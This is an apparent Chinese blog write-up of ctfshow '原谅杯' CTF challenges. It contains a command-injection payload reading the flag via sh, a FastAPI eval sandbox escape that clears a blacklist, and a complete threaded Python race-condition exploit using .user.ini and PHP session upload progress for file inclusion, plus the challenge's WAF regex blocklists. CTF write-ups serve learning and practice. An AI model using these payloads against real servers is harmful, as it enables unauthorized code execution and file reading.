+++
title = "ctfshow原谅杯"
slug = "ctfshow-forgiveness-cup"
description = "刷"
date = "2025-01-16T19:39:50"
lastmod = "2025-01-16T19:39:50"
image = ""
license = ""
categories = ["ctfshow"]
tags = ["php", "RaceCondition"]
+++

## 原谅4

```php
<?php isset($_GET['xbx'])?system($_GET['xbx']):highlight_file(__FILE__);
```

一个压缩包里面没有源码就一个瓜而已，好吧，那就是ls去找看看有没有命令可以用了，我们知道`/bin`下面有命令，得到三个命令

```
ls rm sh
```

然后`sh`把文件读了就行

```
root@dkhkv2c52uxRFLESq7AS:~# sh /flag 2>&1
/flag: 1: flag{I_L0v3_yoU}: not found

?xbx=sh /*f* 2>%261
```

补充一下知识，从别的师傅哪里看到的

> /bin
> 是下面系统的一些指令。主要放置一些系统的必备执行档例如:cat、cp、chmod、df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。
> /sbin
> 一般是指超级用户指令。主要放置一些系统管理的必备程式例如:cfdisk、dhcpcd、dump、e2fsck、fdisk、halt、ifconfig、ifup、ifdown、init、insmod、lilo、lsmod、mke2fs、modprobe、quotacheck、reboot、rmmod、 runlevel、shutdown等。
> /usr/bin　
> 是你在后期安装的一些软件的运行脚本。主要放置一些应用软体工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome*、gzip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、newaliases、nslookup passwd、quota、smb*、wget等。
> /usr/sbin
> 放置一些用户安装的系统管理的必备程式例如:dhcpd、httpd、imap、in.*d、inetd、lpd、named、netconfig、nmbd、samba、sendmail、squid、swap、tcpd、tcpdump等。

## 原谅5_fastapi2

可以先列出来环境变量

```
https://86ca98b0-4bcf-4d26-bb85-a969bb8b6bac.challenge.ctf.show/ccccalcccc

q=list(calc.__globals__)
```

然后得到了一堆东西

```
{"res":["__name__","__doc__","__package__","__loader__","__spec__","__annotations__","__builtins__","__file__","__cached__","Optional","FastAPI","Form","uvicorn","StreamingResponse","BytesIO","app","hello","youdontknow","calc","yl5"],"err":false}
```

查看`youdontknow`发现了黑名单，这里我们可以使用`clear`把东西给清空了

```
q=list(youdontknow)

q=youdontknow.clear()

q=list(youdontknow)
```

就成功了，可以直接进行文件读取

```
q=open('/flag').read()
```

## 原谅6_web3

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include('waf.php');
$file = $_GET['file'] ?? NULL;
$content = $_POST['content'] ?? NULL;
(waf_file($file)&&waf_content($content))?(file_put_contents($file,$content)):NULL;
```

先上传`.user.ini`然后打一个session文件包含即可

```
https://032dbab0-9bd0-49ac-84c2-7d1720ed3950.challenge.ctf.show/?file=.user.ini

content=auto_prepend_file=/tmp/sess_wi
```

```python
import io
import requests
import threading

sessid="wi"
url="http://032dbab0-9bd0-49ac-84c2-7d1720ed3950.challenge.ctf.show/"

def write(session):
    while event.is_set():
        f=io.BytesIO(b'a'*1024*50)
        r=session.post(
            url=url,
            cookies={'PHPSESSID':sessid},
            data={
                "PHP_SESSION_UPLOAD_PROGRESS":"<?php system('ls /');?>"
            },
            files={"file":('wi.txt',f)}
        )

def read(session):
    while event.is_set():
        payload="?file=/tmp/sess_"+sessid
        r=session.get(url=url+payload)

        if 'wi.txt' in r.text:
            print(r.text)
            event.clear()
        else :
            print("nonono")


if __name__=='__main__':
    event=threading.Event()
    event.set()
    with requests.session() as sess:
        for i in range(1,30):
            threading.Thread(target=write,args=(sess,)).start()

        for i in range(1,30):
            threading.Thread(target=read,args=(sess,)).start()


```

同时看了一下waf过滤的是关键词

```php
<?php
function waf_file($file){
    if (!preg_match('/php|filter|\:|\%|\?|\.\./i', $file))
    return true;
    else{
        die("i don't like u!?");
    }
}
function waf_content($concent){
    if ((!preg_match('/php|\<|\>|\?|\`|filter|\%|root|proc|log|\:|\./i', $concent))&&strlen($concent)<36)
    return true;
    else{
        die("what are u donig?!");
    }
}
?>
```

然后还发现根目录没有`flag`，后面给列出来才知道在当前目录`find / -name \"*flag*\" 2>/dev/null`

## fastapi2 for 阿狸

上同
